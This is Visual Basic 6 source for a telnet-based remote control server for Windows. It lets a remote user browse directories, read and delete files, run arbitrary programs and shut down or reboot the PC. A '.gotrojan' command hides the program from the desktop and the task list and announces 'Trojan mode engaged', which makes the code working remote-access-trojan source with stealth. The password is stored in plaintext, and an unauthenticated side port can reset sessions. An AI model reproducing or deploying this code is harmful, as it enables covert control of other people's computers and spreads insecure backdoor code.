VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Telnet System Control"
   ClientHeight    =   600
   ClientLeft      =   45
   ClientTop       =   615
   ClientWidth     =   1935
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   600
   ScaleWidth      =   1935
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox ipblocked 
      Height          =   855
      Left            =   1680
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   5
      Text            =   "Form1.frx":030A
      Top             =   3000
      Width           =   1215
   End
   Begin VB.TextBox WrongPass 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   855
      Left            =   360
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   4
      Text            =   "Form1.frx":04CB
      Top             =   3000
      Width           =   1215
   End
   Begin MSWinsockLib.Winsock Rehash 
      Left            =   4680
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   24
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   3600
      Top             =   240
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   2520
      Top             =   1800
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Reset"
      Height          =   375
      Left            =   240
      TabIndex        =   3
      ToolTipText     =   "Left Click for soft Reset, right click for hard reset"
      Top             =   120
      Width           =   1455
   End
   Begin MSWinsockLib.Winsock sckMail 
      Left            =   5400
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.DirListBox Dir1 
      Height          =   1890
      Left            =   2520
      TabIndex        =   2
      Top             =   720
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.ListBox List1 
      Height          =   2010
      Left            =   360
      TabIndex        =   1
      Top             =   720
      Visible         =   0   'False
      Width           =   2055
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   20000
      Left            =   2520
      Top             =   1200
   End
   Begin VB.FileListBox File1 
      Height          =   2040
      Hidden          =   -1  'True
      Left            =   3840
      System          =   -1  'True
      TabIndex        =   0
      Top             =   720
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   2520
      Top             =   1800
   End
   Begin MSWinsockLib.Winsock Pline 
      Left            =   2880
      Top             =   2040
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   23
   End
   Begin VB.Menu File 
      Caption         =   "File"
      Begin VB.Menu ChUsersettings 
         Caption         =   "Change user settings"
      End
      Begin VB.Menu line1 
         Caption         =   "-"
      End
      Begin VB.Menu SftRes 
         Caption         =   "Soft Reset"
      End
      Begin VB.Menu HrdRes 
         Caption         =   "Hard Reset"
      End
      Begin VB.Menu ConList 
         Caption         =   "Connections List"
      End
      Begin VB.Menu LogList 
         Caption         =   "Loginlist"
      End
      Begin VB.Menu SavMode 
         Caption         =   "Safe mode"
      End
      Begin VB.Menu line2 
         Caption         =   "-"
      End
      Begin VB.Menu About 
         Caption         =   "About"
      End
      Begin VB.Menu line3 
         Caption         =   "-"
      End
      Begin VB.Menu Quit 
         Caption         =   "Quit"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'With this program you can control your PC
'from another PC with a telnet client. just use telnet to log or use my own telnet client
'(Use hostname 127.0.0.1 and port telnet or 23)
'your username followed by a space (chr:32) and your password
'Then, type .help to view a list of supported commands
'Created by Lennert Van Damme
'Ping & Dns source including both this program's modules by freevbcode.com
'lennertvandamme@Hotmail.com
'Feel free to mail any comments/bugs/suggestions or improved versions

Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Boolean
Dim TelNetBuffer As String, UserNick As String
Dim Password As String, Login As Boolean
Dim Connections As String, Trycount As Long
Dim Loginlist As String, Blocked As New Collection
Dim TempDat As String, d As String
Dim AllowLocalPC As String, SaveMode As Boolean

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long

Public Sub TaskVisible(visible As Boolean)
Dim lI As Long
Dim lJ As Long
lI = GetCurrentProcessId()
If Not visible Then
lJ = RegisterServiceProcess(lI, 1)
Else
lJ = RegisterServiceProcess(lI, 0)
End If
End Sub

Private Sub About_Click()
MsgBox "LenSoft Inc. Telnet server control" & Chr(13) & "Copyright© 2000, LenSoft Inc." & Chr(13) & "Ping & Dns source by freevbcode.com" & Chr(13) & "All rights reserved", vbInformation, "About"
End Sub

Private Sub ChUsersettings_Click()
SaveSetting "Telnet", "User", "Nick", InputBox("Enter your nick:")
SaveSetting "Telnet", "User", "Password", InputBox("Enter your password:")
UserNick = GetSetting("Telnet", "User", "Nick", "")
Password = GetSetting("Telnet", "User", "Password", "")
End Sub

Private Sub Command1_Click()
Timer1.Enabled = False
Timer2.Enabled = False
Pline.Close
Pline.Listen
TelNetBuffer = ""
Trycount = 0
Timer2.Enabled = False
Login = False
End Sub

Private Sub Command1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then
Timer1.Enabled = False
Timer2.Enabled = False
Pline.Close
Pline.Listen
TelNetBuffer = ""
Trycount = 0
Timer2.Enabled = False
Login = False
Connections = ""
Loginlist = ""
ClearAllBlocks
End If
End Sub

Private Sub ConList_Click()
MsgBox Connections
End Sub

Private Sub Form_Load()
'ipblocked.Text = "" 'Enable these if you don't want the ASCII-pictures to be shown
'WrongPass.Text = ""
File.visible = False
'Load general settings
Trycount = 0 'Every user gets 3 chanches to log in
UserNick = GetSetting("Telnet", "User", "Nick", "")
If UserNick = "" Then GoTo 1
Password = GetSetting("Telnet", "User", "Password", "")
If Password = "" Then GoTo 1
Pline.Listen 'Launch the server (Standard telnet port = 23)
Rehash.Listen
Exit Sub
1 'Save general user info first time the program is used
SaveSetting "Telnet", "User", "Nick", InputBox("Enter your nick:")
SaveSetting "Telnet", "User", "Password", InputBox("Enter your password:")
Pline.Listen
Rehash.Listen
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then PopupMenu File
End Sub

Private Sub Form_Resize()
'If the user minimizes the form, it becomes invisible
'Use the .show command to make the window visible
If Me.WindowState = 1 Then
Form1.visible = False
Else
Form1.visible = True
End If
End Sub

Private Sub HrdRes_Click()
Timer1.Enabled = False
Timer2.Enabled = False
Pline.Close
Pline.Listen
TelNetBuffer = ""
Trycount = 0
Timer2.Enabled = False
Login = False
Connections = ""
Loginlist = ""
ClearAllBlocks
End Sub

Private Sub LogList_Click()
MsgBox Loginlist
End Sub

Private Sub Pline_Close()
'User quitted, reset settings and relaunch the server
Command1_Click
End Sub

Private Sub Pline_ConnectionRequest(ByVal requestID As Long)
'Someone try's to connect to the server
On Error Resume Next
Trycount = 0
If Pline.State = 2 Then Pline.Close
Pline.Accept requestID
Timer2.Enabled = True 'User gets 20 seconds to log-in
'If the user already failed 3 times to log-in, refuse it's connection
If BlockedIP(Pline.RemoteHostIP) = False Then
1 Connections = Connections & Pline.RemoteHostIP & " " & Date & " at " & Time & vbCrLf
Pline.SendData "Welcome to the LenSoft Inc. Tel-Net Server hosted by " & UserNick & vbCrLf & "Please enter your username & password : "
Else
'If Pline.RemoteHostIP = Pline.LocalIP Then GoTo 1
Pline.SendData ipblocked.Text
Pline.SendData "Your IP has been *blocked*! Reason: Login failure"
Timer1.Enabled = True
Timer2.Enabled = False
TelNetBuffer = ""
End If
End Sub

Function BlockedIP(IPtocheck)
'Check if a certain IP is blocked
'An ip becomes blocked when someone failes to log in 3 times
On Error GoTo 1
a = Blocked.Item(Chr(34) & IPtocheck & Chr(34))
If a = "Blocked" Then
BlockedIP = True
Else
1 BlockedIP = False
End If
End Function

Private Sub Pline_DataArrival(ByVal bytesTotal As Long)
'Process incoming data
'Note: with Telnet, every character is send individualy, which makes it extra hard to get the whole command
On Error Resume Next
Pline.GetData buf$, vbString
If Asc(buf$) = 8 Then GoTo 1
If Asc(buf$) = 13 Then GoTo 2
TelNetBuffer = TelNetBuffer & buf$
Exit Sub
1 If Len(TelNetBuffer) = 0 Then Exit Sub
TelNetBuffer = Left(TelNetBuffer, Len(TelNetBuffer) - 1)
Exit Sub
2 If Login = True Then
'User already logged in
Select Case TelNetBuffer 'Telnetbuffer = Input given by user
Case ".connections": 'Display a list of all attemped connections including date & time
Pline.SendData Connections
Case ".viewblocklist": 'View blocked IP's
If List1.ListCount = 0 Then
Pline.SendData "No blocks"
Else
List1.ListIndex = 0
For i% = 1 To List1.ListCount
Pline.SendData List1.Text & vbCrLf
List1.ListIndex = List1.ListIndex + 1
Next i%
End If
Case ".clearblocklist": 'Clear all IP blocks
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
ClearAllBlocks
List1.Clear
Pline.SendData "All blocks cleared"
End If
Case ".gotrojan":
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Me.visible = False
TaskVisible False 'Gotrojan: command to make the program invisible
Pline.SendData "Trojan mode engaged"
End If
Case ".ping": Pline.SendData "Pong !" 'Ping the server, if the server doesn't respond with 'Pong !', you have to reconnect
Case ".getres": a = Screen.Width / Screen.TwipsPerPixelY
b = Screen.Height / Screen.TwipsPerPixelX
Pline.SendData "Res : " & a & "*" & b
Case ".gethostname": 'Get the remote host name if you used an ip to login
Pline.SendData "Retrieved : " & Pline.LocalHostName
Case ".about": Pline.SendData "LenSoft Inc. Telnet control server" & vbCrLf & "Copyright © 2000, LenSoft Inc." & vbCrLf & "Ping & DNS Source code by freevbcode.com" & vbCrLf & "All rights reserved." & vbCrLf & "This server is hosted by " & UserNick
Case ".help": 'Show all supported commands
Pline.SendData "List of commands:" & vbCrLf & ".loginlist & .connections" & vbCrLf & ".time" & vbCrLf & ".date" & vbCrLf & ".shutdown & .reboot" & vbCrLf & ".viewblocklist" & vbCrLf & ".remblock" & vbCrLf & ".clearblocklist" & vbCrLf & ".addblock" & vbCrLf & ".quit" & vbCrLf & ".kill" & vbCrLf & ".rehash" & vbCrLf & ".erease" & vbCrLf & ".ping" & vbCrLf & ".gotrojan & .show" & vbCrLf & ".gethostname & .gethostip & .getres" & vbCrLf & ".about" & vbCrLf & "view" & vbCrLf & "dir" & vbCrLf & "del" & vbCrLf & "run" & vbCrLf & "sav" & vbCrLf & "ping" & vbCrLf & "dns"
Case ".erase":
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Pline.SendData "Log file erased"
Open "C:\Mijn Documenten\Telnetlog.txt" For Output As #1
Close #1
End If
Case ".show": Me.WindowState = 0
Me.visible = True 'Make the program visible
TaskVisible True
Case ".loginlist": 'Show the log-in list, including Succes or Failure
Pline.SendData Loginlist
Case ".time": 'Show the local time
Pline.SendData "Local time is set to " & Time
Case ".date": 'Show the local date
Pline.SendData "Local date is set to " & Date
Case ".gethostip": 'Get the remote ip if you logged using a hostname
Pline.SendData "Retrieved : " & Pline.RemoteHostIP
Case ".shutdown":
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Pline.SendData "Shutting down..."
Call ExitWindowsEx(1, 0)
End If
Case ".reboot":
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Pline.SendData "Rebooting..."
Call ExitWindowsEx(2, 0)
End If
Case ".quit": 'Confirm that you are quitting
Pline.Close
Login = False
TelNetBuffer = ""
Trycount = 0
Pline.Listen
Case ".kill": 'kill the server
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Pline.Close
Unload Me
End
End If
Case ".rehash": 'Rehash: Restart the server completely. This includes deleting the login & connectionlist
Pline.Close
Login = False
Connections = ""
Loginlist = ""
TelNetBuffer = ""
Trycount = 0
Pline.Listen
Case Else:
'Check for command's with a possible parameter
Select Case Left(TelNetBuffer, 3)
Case ".re": 'Whole command = remblock, remove a single IP-block
'Usage: remblock <IPTOUNBLOCK>
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
TempDat = Right(TelNetBuffer, Len(TelNetBuffer) - 10)
If TempDat = "" Then Exit Sub
Blocked.Remove Chr(34) & TempDat & Chr(34)
List1.Text = TempDat
List1.RemoveItem List1.ListIndex
Pline.SendData "Block removed"
End If
Case "pin": 'Let the server ping another host. Usage: Ping remotehostname
TempDat = Ping(Right(TelNetBuffer, Len(TelNetBuffer) - 5))
If TempDat = True Then
Pline.SendData "Host found (" & RoundTripTime & ")"
Else
Pline.SendData "Host not found"
End If
Case "dns": 'Let the setver dns someone
'To dns = to get an IP using a hostname
'Note: you can also dns a website like www.yahoo.com
TempDat = GetIPAddress(Right(TelNetBuffer, Len(TelNetBuffer) - 4))
If TempDat = "" Then
Pline.SendData "Host not found"
Else
Pline.SendData "Resolved : " & TempDat
End If
Case ".ad": 'Manualy add an IP-block
TempDat = Right(TelNetBuffer, Len(TelNetBuffer) - 10)
Blocked.Add "Blocked", Chr(34) & TempDat & Chr(34)
List1.AddItem TempDat
Pline.SendData TempDat & " blocked"
Case "dir": 'View files in a specified path
File1.Refresh
Dir1.Refresh
If Right(TelNetBuffer, Len(TelNetBuffer) - 4) = "" Then File1.Path = "C:\"
If Right(TelNetBuffer, Len(TelNetBuffer) - 4) = "" Then Dir1.Path = "C:\"
File1.Path = Right(TelNetBuffer, Len(TelNetBuffer) - 4)
Dir1.Path = Right(TelNetBuffer, Len(TelNetBuffer) - 4)
If Dir1.ListCount = 0 Then GoTo 3
For i% = 1 To Dir1.ListCount
d = Dir1.List(i% - 1)
d = GetLastDir(d)
Pline.SendData UCase(d) & " <DIR>" & vbCrLf
Next i%
3 File1.ListIndex = 0
For i% = 1 To File1.ListCount
Pline.SendData File1.FileName & vbCrLf
File1.ListIndex = File1.ListIndex + 1
Next i%
Pline.SendData File1.ListCount & " File(s), " & Dir1.ListCount & " Dir(s)" & vbCrLf
Pline.SendData "End of /Dir list"
Case "del": 'Delete a file
If SaveMode = True Then
Pline.SendData "This command is currently unavailable"
Else
Kill Right(TelNetBuffer, Len(TelNetBuffer) - 4)
End If
Case "vie": 'View the contents of a certain file, only works with small files (<64 KB)
TempDat = Right(TelNetBuffer, Len(TelNetBuffer) - 5)
If TempDat = "" Then Exit Sub
Open TempDat For Input As #1
a = Input$(LOF(1), #1)
Close #1
Pline.SendData a
Case "sav": 'Save data to the log file
Open "C:\Mijn Documenten\Telnetlog.txt" For Append As #1
Print #1, Right(TelNetBuffer, Len(TelNetBuffer) - 4)
Close #1
Pline.SendData "Saved ..."
Case "run": 'Execute a program on the remote PC
Shell Right(TelNetBuffer, Len(TelNetBuffer) - 4)
Case Else: 'The command is not recognized
Pline.SendData "No idea what you're talking about"
End Select
End Select
TelNetBuffer = ""
Pline.SendData vbCrLf & ">"
Else
'User hasn't logged in yet
If TelNetBuffer = UserNick & " " & Password Then
Pline.SendData "Login Correct" & vbCrLf & ">"
Timer2.Enabled = False
Loginlist = Loginlist & "Succes => " & Pline.RemoteHostIP & " " & Date & " at " & Time & " (" & Trycount & ")" & vbCrLf
TelNetBuffer = ""
Login = True
Else
Trycount = Trycount + 1
Pline.SendData "Login failed" & vbCrLf & ">"
TelNetBuffer = ""
If Trycount = 3 Then
Pline.SendData WrongPass.Text
Pline.SendData "You have tried your luck one too many times, you stupid hacker" & vbCrLf & "Your Ip & Hostmask have been recorded"
Blocked.Add "Blocked", Chr(34) & Pline.RemoteHostIP & Chr(34)
List1.AddItem Pline.RemoteHostIP
Timer2.Enabled = False
Loginlist = Loginlist & "Failed => " & Pline.RemoteHostIP & " " & Date & " at " & Time & vbCrLf
Timer1.Enabled = True
End If
End If
End If
End Sub

Sub ClearAllBlocks()
'Clear all IP block's
If List1.ListCount = 0 Then Exit Sub
List1.ListIndex = 0
For i% = 1 To List1.ListCount
Blocked.Remove Chr(34) & List1.Text & Chr(34)
List1.RemoveItem List1.ListIndex
Next i%
End Sub

Private Sub Quit_Click()
Unload Me
End Sub

Private Sub Rehash_Close()
Rehash.Close
Rehash.Listen
End Sub

Private Sub Rehash_ConnectionRequest(ByVal requestID As Long)
If Rehash.State = 2 Then Rehash.Close
Rehash.Accept requestID
Timer4.Enabled = True 'Must type © within 5 seconds
End Sub

Private Sub Rehash_DataArrival(ByVal bytesTotal As Long)
'You want to connect but another user already connected.
'Since this server has no multiple-connections support,
'you can not log-in.
'If you want to disconnect the current user, connect to port 24
'and type the © sign (this is formed Alt+8888)
Rehash.GetData reh$, vbString
If reh$ = "©" Then
Command1_Click
End If
Rehash.Close
Rehash.Listen
End Sub

Private Sub SavMode_Click()
'With safe mode enabled, users will not be able to
'perform certain command like .del & .gotrojan
SavMode.Checked = Not SavMode.Checked
SaveMode = Not SaveMode
End Sub

Private Sub SftRes_Click()
Command1_Click
End Sub

Private Sub Timer1_Timer()
'Close the connection
Timer1.Enabled = False
Pline.Close
Trycount = 0
TelNetBuffer = ""
Pline.Listen
End Sub

Private Sub Timer2_Timer()
'Close connection if user hasn't yet connected within 20 seconds
On Error Resume Next
Pline.SendData "Err.: Login-Timeout, closing link"
Timer1.Enabled = True
Timer2.Enabled = False
End Sub

Function GetLastDir(FullDir As String)
'Get the last folder from a full path
'Also used in my MS-dos prompt
c = 1
For i% = 1 To Len(FullDir)
a = Right(FullDir, c)
a = Left(a, 1)
If a = "\" Then GoTo 1
c = c + 1
Next i%
GetLastDir = 0
Exit Function
1 GetLastDir = Right(FullDir, c - 1)
End Function

Private Sub sckMail_DataArrival(ByVal bytesTotal As Long)
Dim strAns As String
Dim Scode As String
Dim sError As String

sckMail.GetData strAns, vbString
Scode = UCase$(Left$(strAns, 3))


Select Case Scode
    Case "220"
    If Not gbConnectOK Then
        gbConnectOK = True
    Else
        gbRequestAccepted = True
    End If
    Case "250", "221"
    gbRequestAccepted = True
    Case "354"
    gbDataOK = True
    Case Else
        sError = TrimWithoutPrejudice(Mid(strAns, 4))
        oMailer.AddError sError
        oMailer.SendFail
End Select
End Sub

Private Sub Timer3_Timer()
If Pline.State = 9 Then
Command1_Click
End If
If Rehash.State = 9 Then
Rehash.Close
Rehash.Listen
End If
End Sub

Private Sub Timer4_Timer()
Timer4.Enabled = False
Rehash.Close
Rehash.Listen
End Sub
